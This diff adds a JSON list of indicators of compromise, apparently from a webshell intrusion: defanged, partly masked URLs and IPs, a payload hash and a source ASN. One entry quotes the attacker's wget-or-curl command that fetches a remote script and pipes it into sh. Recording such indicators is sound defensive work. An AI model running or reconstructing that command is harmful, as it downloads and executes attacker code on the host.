@@ -1,0 +1,45 @@
+[
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxps://217[.]60[.]195[.]XXX/sh"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxps://217[.]60[.]195[.]XXX/sh)"
+  },
+  {
+    "context": "Embedded IP in inbound payload",
+    "source": "static_analysis",
+    "type": "ip",
+    "value": "190[.]179[.]169.XXX"
+  },
+  {
+    "context": "Embedded IP in inbound payload",
+    "source": "static_analysis",
+    "type": "ip",
+    "value": "217[.]60[.]195.XXX"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "(wget --no-check-certificate -qO- hxxps://217[.]60[.]195[.]XXX/sh || curl -sk hxxps://217[.]60[.]195[.]XXX/sh) | sh -s apache.selfre"
+  },
+  {
+    "context": "Inbound payload hash (webshell)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "321959092cd43542fc5341243136a04afc96866132f16652feaaea06a498d2d9"
+  },
+  {
+    "asn": "Nahor Hadish Design and Architecture Co., Ltd",
+    "country": "United Arab Emirates",
+    "role": "artifact_source",
+    "type": "ip",
+    "value": "94[.]183[.]216.XXX"
+  }
+]
